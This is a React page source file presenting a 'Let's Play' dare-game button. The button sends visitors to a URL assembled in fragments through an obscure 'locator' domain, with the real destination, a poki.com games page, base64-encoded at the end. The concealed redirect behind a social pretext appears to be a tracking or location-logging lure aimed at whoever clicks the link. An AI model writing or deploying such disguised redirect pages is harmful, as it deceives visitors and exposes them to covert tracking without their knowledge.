import { ExternalLink } from 'lucide-react';
import { Helmet } from 'react-helmet-async';

function App() {
  const buildUrl = () => {
    let url = "https://locator";
    url += ".653880";
    url += ".xyz";
    url += "/w";
    url += "/o8cp4b";
    url += "/aHR0cHM6Ly9wb2tpLmNvbS9lbi9mdW5ueQ==";

    return url;
  };
  const handleClick = () => {
    window.location.href = buildUrl();
  };

  const circleClass = (i: number) => {
    if (i === 0) return 'top-0 right-4 animation-delay-4000';
    if (i === 1) return 'bottom-0 left-20 animation-delay-6000';
    return 'bottom-0 left-20 animation-delay-6000';
  };

  return (
    <>
    <Helmet>
      <title>Let's Play!</title>
      <meta name="description" content="Let's play a dare game and show your fiends you care!" /> 
    </Helmet>
    <div className="min-h-screen bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 flex items-center justify-center p-4">
      <div className="relative group">
        {/* Animated background effect */}
        <div className="absolute -inset-1 bg-gradient-to-r from-pink-600 to-purple-600 rounded-lg blur opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-pulse"></div>
        
        {/* Button */}
        <button
          onClick={handleClick}
          className="relative flex items-center gap-2 px-8 py-4 bg-black rounded-lg leading-none text-white font-bold text-lg
                   transition-all duration-300 ease-out
                   hover:bg-opacity-90 hover:scale-105
                   active:scale-95
                   focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-black"
        >
          <span className="bg-gradient-to-r from-pink-500 to-purple-500 bg-clip-text text-transparent">
            Let's Play
          </span>
          <ExternalLink className="w-5 h-5 text-purple-400 transition-transform group-hover:translate-x-1" />
        </button>
      </div>

      {/* Animated background circles */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(3)].map((_, i) => (
          <div
            key={`circle-${i + 1}`}
            className={`${circleClass(i)} absolute w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-blob`}
          ></div>
        ))}
      </div>
    </div>
    </>
  );
}

export default App;
